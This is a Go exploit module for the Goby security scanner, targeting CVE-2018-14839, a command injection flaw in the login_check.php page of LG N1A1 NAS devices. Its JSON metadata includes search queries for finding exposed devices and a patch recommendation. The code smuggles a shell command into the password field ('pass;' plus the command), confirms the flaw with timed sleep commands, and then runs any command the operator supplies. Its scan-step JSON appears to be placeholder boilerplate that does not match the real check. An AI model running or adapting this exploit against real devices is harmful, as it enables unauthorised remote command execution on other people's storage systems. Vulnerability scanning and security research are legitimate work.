package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "LG N1A1 NAS login_check.php Remote Command Execution Vulnerability (CVE-2018-14839)",
    "Description": "<p>LG N1A1 NAS is a network storage device produced by South Korea's LG.</p><p>An operating system command injection vulnerability exists in LG N1A1 NAS version 3718.510. The vulnerability stems from the fact that login_check.php does not properly filter special characters, commands, etc. in it. Attackers can exploit this vulnerability to execute illegal operating system commands.</p>",
    "Product": "LG-Network-Storage",
    "Homepage": "http://www.lge.co.kr/",
    "DisclosureDate": "2023-01-12",
    "Author": "mayi",
    "FofaQuery": "title=\"Welcome to LG Electronics\" || body=\"style=\\\"background:url('../images/login/form_bg_LG_NAS_Storage.gif'); background-repeat:no-repeat;\\\">\" || title=\"LG Network Storage\"",
    "GobyQuery": "title=\"Welcome to LG Electronics\" || body=\"style=\\\"background:url('../images/login/form_bg_LG_NAS_Storage.gif'); background-repeat:no-repeat;\\\">\" || title=\"LG Network Storage\"",
    "Level": "3",
    "Impact": "<p>An operating system command injection vulnerability exists in LG N1A1 NAS version 3718.510. The vulnerability stems from the fact that login_check.php does not properly filter special characters, commands, etc. in it. Attackers can exploit this vulnerability to execute illegal operating system commands.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"https://www.lg.com/\">https://www.lg.com/</a></p>",
    "References": [
        "https://www.exploit-db.com/exploits/45109"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "sleep 10",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2018-14839"
    ],
    "CNNVD": [
        "CNNVD-201905-609"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "LG N1A1 NAS 网络存储设备 login_check.php 文件 password 参数远程命令执行漏洞（CVE-2018-14839）",
            "Product": "LG-Network-Storage",
            "Description": "<p>LG N1A1 NAS是韩国乐金（LG）公司的一款网络存储设备。<br></p><p>LG N1A1 NAS 3718.510版本中存在操作系统命令注入漏洞，该漏洞源于 login_check.php 未正确过滤其中的特殊字符、命令等，攻击者可利用该漏洞执行非法操作系统命令。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href=\"https://www.lg.com/\">https://www.lg.com/</a><br></p>",
            "Impact": "<p>LG N1A1 NAS 3718.510版本中存在操作系统命令注入漏洞，该漏洞源于 login_check.php 未正确过滤其中的特殊字符、命令等，攻击者可利用该漏洞执行非法操作系统命令。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "LG N1A1 NAS login_check.php Remote Command Execution Vulnerability (CVE-2018-14839)",
            "Product": "LG-Network-Storage",
            "Description": "<p>LG N1A1 NAS is a network storage device produced by South Korea's LG.<br></p><p>An operating system command injection vulnerability exists in LG N1A1 NAS version 3718.510. The vulnerability stems from the fact that <span style=\"color: rgb(22, 28, 37); font-size: 16px;\">login_check</span>.php does not properly filter special characters, commands, etc. in it. Attackers can exploit this vulnerability to execute illegal operating system commands.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"https://www.lg.com/\">https://www.lg.com/</a><br></p>",
            "Impact": "<p>An operating system command injection vulnerability exists in LG N1A1 NAS version 3718.510. The vulnerability stems from the fact that <span style=\"color: rgb(22, 28, 37); font-size: 16px;\">login_check</span>.php does not properly filter special characters, commands, etc. in it. Attackers can exploit this vulnerability to execute illegal operating system commands.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9960"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			cmd := "sleep 0"
			var cmdtime time.Duration
			cmdTime0 := time.Now()
			if cmdTime1, result := login_check_NAS_LGN1A1(u, cmd); result {
				cmdtime = cmdTime1.Sub(cmdTime0)

			}

			cmd1 := "sleep 5"
			var cmd1time time.Duration
			cmd1Time0 := time.Now()
			if cmd1Time1, result := login_check_NAS_LGN1A1(u, cmd1); result {
				cmd1time = cmd1Time1.Sub(cmd1Time0)
			}

			cmd2 := "sleep 10"
			var cmd2time time.Duration
			cmd2Time0 := time.Now()
			if cmd2Time1, result := login_check_NAS_LGN1A1(u, cmd2); result {
				cmd2time = cmd2Time1.Sub(cmd2Time0)
			}

			if cmd1time.Seconds() < cmdtime.Seconds()+7 && cmd2time.Seconds() > cmdtime.Seconds()+7 {
				return true
			}
			return false

		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			if _, result := login_check_NAS_LGN1A1(expResult.HostInfo, cmd); result {
				expResult.Output = "命令已执行"
				expResult.Success = true
			}
			return expResult
		},
	))
}

func login_check_NAS_LGN1A1(u *httpclient.FixUrl, cmd string) (time.Time, bool) {

	cfg := httpclient.NewPostRequestConfig("/en/php/login_check.php")

	cfg.VerifyTls = false
	cfg.FollowRedirect = false
	cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
	cfg.Data = fmt.Sprintf("op_mode=login&id=admin&password=pass;" + cmd + "&mobile=false")
	cfg.Timeout = 25
	if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
		Time1 := time.Now()
		return Time1, true
	}
	return time.Now(), false
}